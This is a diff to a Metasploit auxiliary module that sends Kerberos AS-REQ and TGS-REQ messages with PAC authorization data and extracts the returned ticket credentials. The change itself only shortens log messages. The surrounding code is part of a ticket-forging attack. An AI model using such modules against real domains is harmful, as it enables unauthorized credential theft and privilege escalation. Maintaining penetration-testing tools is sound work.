@@ -83,7 +83,7 @@ class MetasploitModule < Msf::Auxiliary
     pre_auth << build_as_pa_time_stamp(key: password_digest, etype: etype)
     pre_auth << build_pa_pac_request
 
-    print_status("#{peer} - Sending AS-REQ...")
+    print_status("Sending AS-REQ...")
     res = send_request_as(
       client_name: datastore['USERNAME'].to_s,
       server_name: "krbtgt/#{domain}",
@@ -94,12 +94,12 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     unless res.msg_type == Rex::Proto::Kerberos::Model::AS_REP
-      print_warning("#{peer} - #{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
-      print_error("#{peer} - Invalid AS-REP, aborting...")
+      print_warning("#{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
+      print_error("Invalid AS-REP, aborting...")
       return
     end
 
-    print_status("#{peer} - Parsing AS-REP...")
+    print_status("Parsing AS-REP...")
 
     session_key = extract_session_key(res, password_digest)
     logon_time = extract_logon_time(res, password_digest)
@@ -129,7 +129,7 @@ class MetasploitModule < Msf::Auxiliary
     auth_data = build_pac_authorization_data(pac: pac)
     sub_key = build_subkey(subkey_type: etype)
 
-    print_status("#{peer} - Sending TGS-REQ...")
+    print_status("Sending TGS-REQ...")
 
     res = send_request_tgs(
       client_name: datastore['USER'],
@@ -143,12 +143,12 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     unless res.msg_type == Rex::Proto::Kerberos::Model::TGS_REP
-      print_warning("#{peer} - #{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
-      print_error("#{peer} - Invalid TGS-REP, aborting...")
+      print_warning("#{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
+      print_error("Invalid TGS-REP, aborting...")
       return
     end
 
-    print_good("#{peer} - Valid TGS-Response, extracting credentials...")
+    print_good("Valid TGS-Response, extracting credentials...")
 
     cache = extract_kerb_creds(res, sub_key.value)
     Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(cache, framework_module: self, host: rhost)
